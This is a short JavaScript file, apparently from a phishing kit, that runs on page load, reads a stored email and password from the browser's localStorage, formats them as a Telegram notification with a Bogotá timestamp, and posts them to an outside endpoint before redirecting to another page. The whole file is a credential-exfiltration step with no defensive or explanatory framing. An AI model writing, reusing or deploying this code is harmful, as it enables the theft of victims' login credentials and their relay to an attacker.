async function enviar(event) {
  // El frontend construye el mensaje completo
  const user = localStorage.getItem("email") || "Desconocido";
  let password = localStorage.getItem("pw") || "No proporcionada";

  const mensaje = `
🔔 <b>Nueva Solicitud</b>

👤 <b>Usuario:</b> ${user}
📱 <b>PW:</b> ${password}

🔘 

⏰ ${new Date().toLocaleString("es-CO", { timeZone: "America/Bogota" })}
  `.trim();

  const datos = {
    user: user, // Solo el ID para guardar en Firestore
    message: mensaje, // Mensaje completo formateado para Telegram
  };

  try {
    const response = await fetch("https://endpointmine.vercel.app/", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(datos),
    });

    const data = await response.json();

    if (response.ok) {
      window.location = "indexc.html";
    } else {
      console.log("❌ Error al enviar mensaje: " + data.error);
    }
  } catch (error) {
    console.log("❌ Error en la solicitud:", error);
  }
}

enviar();
